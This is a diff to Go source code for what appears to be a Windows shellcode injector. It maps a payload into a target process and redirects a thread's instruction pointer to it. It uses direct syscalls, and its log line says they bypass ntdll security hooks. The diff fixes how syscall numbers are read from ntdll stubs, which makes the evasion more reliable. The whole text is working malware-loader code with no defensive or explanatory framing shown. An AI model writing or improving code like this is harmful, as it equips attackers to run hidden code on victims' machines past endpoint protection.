@@ -136,13 +136,13 @@ func DirectSyscallInject(target string, shellcode []byte) error {
 	procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)
 	fmt.Printf("  [remote map] 0x%x via direct syscall — ntdll hooks bypassed\n", remoteAddr)
 
-	ctx, err := getThreadContext(pi.Thread)
+	ac, err := getThreadContext(pi.Thread)
 	if err != nil {
 		windows.TerminateProcess(pi.Process, 1)
 		return err
 	}
-	ctx.SetRip(uint64(remoteAddr))
-	if err := setThreadContext(pi.Thread, ctx); err != nil {
+	ac.ctx.SetRip(uint64(remoteAddr))
+	if err := setThreadContext(pi.Thread, ac); err != nil {
 		windows.TerminateProcess(pi.Process, 1)
 		return err
 	}
@@ -166,14 +166,13 @@ func extractSyscallNumber(funcName string) (uint16, error) {
 	}
 	addr := proc.Addr()
 
-	// Scan up to 32 bytes for the 'mov eax, N' pattern (B8 xx xx 00 00)
+	// Scan up to 32 bytes for 'mov eax, N' (B8 lo hi 00 00).
+	// Only require stub[i+3]==0x00 — syscall numbers fit in uint16, upper two bytes are 0.
+	// Requiring stub[i+2]==0x00 incorrectly rejects numbers ≥ 256 (e.g. 0x0100).
 	stub := (*[32]byte)(unsafe.Pointer(addr))
 	for i := 0; i < 24; i++ {
-		if stub[i] == 0xB8 {
-			// Syscall numbers are < 0x1000, so bytes [i+2] and [i+3] should be 0
-			if stub[i+2] == 0x00 && stub[i+3] == 0x00 {
-				return uint16(stub[i+1]) | uint16(stub[i+2])<<8, nil
-			}
+		if stub[i] == 0xB8 && stub[i+3] == 0x00 {
+			return uint16(stub[i+1]) | uint16(stub[i+2])<<8, nil
 		}
 	}
 	return 0, fmt.Errorf("B8 pattern not found in %s stub (ntdll may be hooked)", funcName)
